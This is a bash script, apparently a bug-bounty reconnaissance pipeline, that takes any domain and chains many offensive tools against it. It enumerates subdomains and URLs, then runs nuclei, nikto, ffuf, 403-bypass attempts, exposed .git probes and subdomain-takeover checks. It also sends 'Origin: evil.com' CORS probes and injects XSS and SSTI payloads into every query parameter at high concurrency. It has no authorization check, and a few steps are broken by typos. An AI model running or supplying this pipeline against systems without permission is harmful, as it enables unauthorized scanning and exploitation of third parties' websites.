#/bin/bash

figlet -c Recon of Recon

echo Insert URL:
read url
mkdir $url
cd $url
echo $url | anew url;

echo $(cat url) | waybackurls | anew waybackurls;

gau $(cat url) | /home/edio/go/bin/./httpx -mc 200 -silent  | anew gau;

echo $(cat url) | /home/edio/go/bin/./httpx -silent | hakrawler -subs | anew hakrawler;

echo $(cat url) | /home/edio/go/bin/./httpx -silent | katana -d 10 -silent | anew katana;

subfinder -d $(cat url) -silent -all | /home/edio/go/bin/./httpx -silent -sc -t 1000 | anew subfinder;

subfinder -d $(cat url)   | /home/edio/go/bin/./httpx -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | /home/edio/go/bin/./httpx -silent | anew | waybackurls | anew findomain';

cat gau katana waybackurls hakrawler findomain | anew allurls;

cat allurls | gf xss      | anew xss;
cat allurls | gf lfi      | anew lfi;  
cat allurls | gf rce      | anew rce;
cat allurls | gf sqli     | anew sqli; 
cat allurls | gf idor     | anew idor; 
cat allurls | gf ssrf     | anew ssrf;
cat allurls | gf ssti     | anew ssti; 
cat allurls | gf redirect | anew redirect;

cat allurls | grep -E '\.(js|txt)$' | anew js;

cd js /home/edio/JSScanner;

cat js | mantra | anew mantra;

cat allurls | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]' | anew htmlComents;

xargs -a js -n2 -I{} bash -c "echo -e '\n[URL]: {}\n'; python3 /linkfinder.py -i {} -o cli" | python3 /collector.py output;

cat subfinder | grep 200 | anew http200;
cat subfinder | grep 404 | anew http404;

while IFS= read -r line;
    do dig "$line"
done < "http404" | anew dig;

subzy run --targets subfinder | anew takeover;

assetfinder $(cat url) | /home/edio/go/bin/./httpx -threads 300 -follow-redirects -silent | /home/edio/go/bin/./rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null | anew cors;

cat subfinder | waybackrobots -d $(cat url) -raw | anew wayROBOTS;

/home/edio/nikto/program/./nikto.pl -h $(cat url) | anew nikto;

curl -s "https://crt.sh/?q=$(cat url)&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g'        | httpx -title -silent   | anew crtsh;
curl -s "https://crt.sh/?q=$(cat url)&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew gitHEADtemp; cat gitHEADtemp | grep 200 | anew gitHEAD;

whatweb $(cat url) | anew whatweb;

nuclei -t /home/edio/fuzzing-templates -list allurls | anew fuzzingtemplates;

python3 /home/edio/dirsearch/dirsearch.py -u $(cat url);

ffuf -w /home/edio/SecLists/Fuzzing/fuzz-Bo0oM.txt -u https://$url/FUZZ | anew ffuftemp; cat ffuftemp | grep 200 | anew ffuf;

python3 /home/edio/XSStrike/xsstrike.py -u $(cat url) | anew xsstrike;

cat allurls |  dalfox pipe | anew dalfox;

python3 /home/edio/byp4xx/byp4xx.py --url https://$(cat url) --dir secret --port     | anew porttemp;     cat porttemp     | grep 200 | anew port;
python3 /home/edio/byp4xx/byp4xx.py --url https://$(cat url) --dir secret --header   | anew headertemp;   cat headertemp   | grep 200 | anew header;
python3 /home/edio/byp4xx/byp4xx.py --url https://$(cat url) --dir secret --method   | anew methodtemp;   cat metohodtemp  | grep 200 | anew method;
python3 /home/edio/byp4xx/byp4xx.py --url https://$(cat url) --dir secret --encode   | anew encodetemp;   cat encodetemp   | grep 200 | anew encode;
python3 /home/edio/byp4xx/byp4xx.py --url https://$(cat url) --dir secret --protocol | anew protocoltemp; cat protocoltemp | grep 200 | anew protocol;

cat allurls | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss1;
cat allurls | uro | qsreplace '<script>alert(1)</script>'       | freq | egrep -v 'Not' | anew xss2;
cat allurls | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
cat allurls | uro | qsreplace '{{7*7}}'                         | freq | egrep -v 'Not' | anew ssti2;
cat allurls | uro | qsreplace '"><svg onload=confirm(1)>'       | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss4;

echo $(cat url) | subfinder -silent | /home/edio/go/bin/./httpx -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei;

